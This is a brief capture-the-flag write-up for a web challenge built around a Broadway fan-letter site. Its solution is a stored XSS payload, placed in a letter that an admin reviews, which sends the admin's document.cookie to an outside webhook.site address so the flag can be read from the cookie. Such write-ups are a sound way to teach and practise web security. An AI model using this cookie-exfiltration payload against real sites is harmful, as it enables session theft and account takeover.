* Description 
Welcome to the glitzy world of Broadway! the hit revival of 'Sunset Boulevard' starring Nicole Scherzinger has taken
the theater world by storm. As part of the fan engagement team, you're discovered a website where fans can send letters
to the star. However, rumors suggest that a *hidden admin dashboard* contains something valuable-possibly the CTF flag.

* Solution

When open the site, we can see a =form= to send a letter, and description hint us that admin will =review= the letter.
So maybe there's XSS injection to exploit.

#+begin_src javascript
<script>
fetch("https://webhook.site/2b96145b-5a94-4c8c-a2b5-ef09464a175d?c=" + document.cookie);
</script>
#+end_src

after send it to admin, we can get flag in cookie in [[https://webhook.site][webhook-site]]
